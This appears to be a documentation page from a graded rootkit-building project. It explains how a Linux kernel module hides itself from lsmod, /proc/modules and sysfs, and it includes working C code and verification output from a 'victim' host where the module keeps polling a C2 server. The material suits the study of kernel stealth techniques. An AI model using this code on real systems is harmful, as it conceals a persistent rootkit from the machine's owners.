---
title: Hide from Module List
description: The module removes itself from lsmod, /proc/modules and /sys/module/ immediately on load.
---

**Optional · 1 pt**

The module removes itself from `lsmod`, `/proc/modules`, and `/sys/module/` immediately on load.

## How it works

The Linux kernel maintains two data structures that expose loaded modules to userland:

- A **doubly-linked list** of `struct module` accessible via `/proc/modules` (and `lsmod`)
- A **kobject** in sysfs under `/sys/module/`

`hide_module()` removes `THIS_MODULE` from both. This is done *before* the C2 polling thread is started, so by the time the rootkit makes its first network request, it is already invisible.

## Implementation

```c
// rootkit/src/hide.c

void hide_module(void)
{
    // Remove from the kernel's module list → invisible in lsmod
    // and /proc/modules
    list_del_init(&THIS_MODULE->list);

    // Remove the kobject from sysfs → invisible in /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
}
```

:::note[list_del_init]
`list_del_init` unlinks the node from the doubly-linked list and reinitialises its pointers to point to itself. The module object remains in memory and fully functional; it is simply no longer reachable from the public list traversal used by `lsmod` and `/proc/modules`.
:::

## Verification

```sh
# After insmod on the victim:

$ lsmod | grep wlkom
# no output — module is hidden

$ cat /proc/modules | grep wlkom
# no output

$ ls /sys/module/ | grep wlkom
# no output

$ dmesg | tail -3
# kernel log still shows: c2: registered uuid=...
```

The module is still running and polling — only its visibility to userland tools is removed.

:::note[rmmod after hiding]
After `hide_module()` runs, `rmmod` can no longer unload the module — it looks up modules by name in the module list, which no longer contains `wlkom`. This is intentional for a rootkit: once hidden, the module stays resident until the machine reboots.
:::

## Correct removal order

`list_del_init()` must come before `kobject_del()`. Calling them in the reverse order causes a kernel panic: sysfs internally iterates the module list during its own cleanup, and removing the kobject while the module is still reachable from the list causes a use-after-free.
